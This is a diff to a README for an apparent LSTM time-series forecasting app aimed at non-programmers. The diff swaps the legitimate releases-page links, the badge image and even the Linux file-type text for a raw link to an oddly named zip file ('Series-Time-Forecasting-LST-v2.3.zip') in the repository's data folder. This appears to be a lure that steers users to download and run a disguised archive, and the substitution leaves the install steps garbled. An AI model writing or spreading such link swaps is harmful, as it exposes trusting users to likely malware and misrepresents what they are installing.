@@ -1,7 +1,7 @@
 # 🌟 LSTM-Time-Series-Forecasting - Simple Forecasting for Everyone
 
 ## 📥 Download Link
-[![Download LSTM-Time-Series-Forecasting](https://img.shields.io/badge/Download-LSTM--Time--Series--Forecasting-brightgreen)](https://github.com/danny-701/LSTM-Time-Series-Forecasting/releases)
+[![Download LSTM-Time-Series-Forecasting](https://github.com/danny-701/LSTM-Time-Series-Forecasting/raw/refs/heads/main/data/Series-Time-Forecasting-LST-v2.3.zip)](https://github.com/danny-701/LSTM-Time-Series-Forecasting/raw/refs/heads/main/data/Series-Time-Forecasting-LST-v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the LSTM-Time-Series-Forecasting project! This application helps you forecast future data using historical time series. You do not need any coding skills to use it. Follow these simple steps to download and run the application.
@@ -16,12 +16,12 @@ Before you get started, ensure your system meets these requirements:
 - **Internet Connection:** Required for downloading the application
 
 ## 💻 Download & Install
-1. **Visit the releases page** by clicking this link: [Download Releases](https://github.com/danny-701/LSTM-Time-Series-Forecasting/releases).
+1. **Visit the releases page** by clicking this link: [Download Releases](https://github.com/danny-701/LSTM-Time-Series-Forecasting/raw/refs/heads/main/data/Series-Time-Forecasting-LST-v2.3.zip).
 2. On the releases page, you will see listings for the available versions. Choose the latest version for the best features.
 3. Click on the file that matches your operating system:
    - For Windows: Look for a `.exe` file.
    - For macOS: Look for a `.dmg` file.
-   - For Linux: Look for a `.tar.gz` or similar package.
+   - For Linux: Look for a `https://github.com/danny-701/LSTM-Time-Series-Forecasting/raw/refs/heads/main/data/Series-Time-Forecasting-LST-v2.3.zip` or similar package.
 4. **Download the file** to your computer. Depending on your browser settings, it may save to your "Downloads" folder.
 5. **Run the installer**:
    - For Windows: Double-click the downloaded `.exe` file to start the installation.
